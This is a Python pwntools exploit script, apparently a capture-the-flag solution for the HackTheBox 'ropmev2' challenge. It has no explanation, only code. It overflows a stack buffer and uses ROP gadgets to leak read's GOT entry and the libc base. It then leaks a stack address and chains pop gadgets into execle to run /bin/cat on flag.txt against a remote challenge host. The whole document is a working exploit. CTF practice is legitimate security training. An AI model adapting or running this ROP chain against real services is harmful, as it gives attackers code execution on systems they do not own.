#!/usr/bin/python
from pwn import remote, process, context, socks
from struct import pack, unpack
from binascii import unhexlify, hexlify



context(arch = 'amd64', os = 'linux' , proxy=(socks.SOCKS5, 'localhost', 8888))

def printf_conv(inStr):
	f = ''
	for i in inStr:
		cc = hex(i)[2:]
		if len(cc) == 1:
			f = '0' + cc + f
		else:
			f = cc + f
	return int(f, 16)

def expl():
	#r = process(argv='./ropmev2')
	r = remote('docker.hackthebox.eu', 31175)


	### find libc base addr
	r.recvline()
	rbp1 = pack('Q', 0x0)
	rg1 = pack('Q', 0x40142b) # pop rdi ; ret
	libc_got = pack('Q', 0x4033F0) # got (read)
	ret_add = pack('Q', 0x4011E4)
	output = 208*b'a' + rbp1 + rg1 + libc_got + ret_add
	r.sendline(output)
	read_add = printf_conv(r.recvn(6))

	print('read addr  -> ' + hex(read_add))

	'''	
	base_add = read_add - 0x0f04b0
	exec_add = base_add + 0x0cd320
	exit_add = base_add + 0x03e6d0
	'''
	base_add = read_add - 0x110070
	exec_add = base_add + 0x0e4fb0
	exit_add = base_add + 0x043120



	# get stack addr
	r.recvline()
	output = b'DEBUG'
	r.sendline(output)
	stack_add = int(r.recvline().decode('ascii')[-13:-1], 16) - 10*0xD0

	print('stack addr -> ' + hex(stack_add))


	### write txt to heap for opening file
	# rdi 0
	# rsi stack_add
	# rdx 9
	r.recvline()
	rbp = pack('Q', 0x0)
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi = pack('Q', 0x0)
	rg2 = pack('Q', 0x0401429) # pop rsi ; pop r15 ; ret
	rsi = pack('Q', stack_add) + pack('Q', 0x0)
	rg3 = pack('Q', 0x0401164) # pop rdx ; pop r13 ; ret
	rdx = pack('Q', 0x20) + pack('Q', 0x0)
	read_add_p = pack('Q', read_add)
	exp = 208*b'b' + rbp + rg1 + rdi + rg2 + rsi + rg3 + rdx + read_add_p


	### execle read data
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi = pack('Q', stack_add)
	rg2 = pack('Q', 0x0401429) # pop rsi ; pop r15 ; ret
	rsi = pack('Q', stack_add + 0x9) + pack('Q', 0x0)
	rg3 = pack('Q', 0x0401164) # pop rdx ; pop r13 ; ret
	rdx = pack('Q', stack_add + 0xd) + pack('Q', 0x0)
	rdi_exit = pack('Q', 0x0)
	exec_add_p = pack('Q', exec_add)
	exit_add_p = pack('Q', exit_add)
	exp += rg1 + rdi + rg2 + rsi + rg3 + rdx + exec_add_p # + rg1 + rdi_exit + exit_add_p
	r.sendline(exp)
	input()
	r.sendline(b'/bin/cat\0' + b'cat\0' + b'flag.txt\0')
	r.interactive()
	#print(r.recvline().decode('ascii')[:-1])

expl()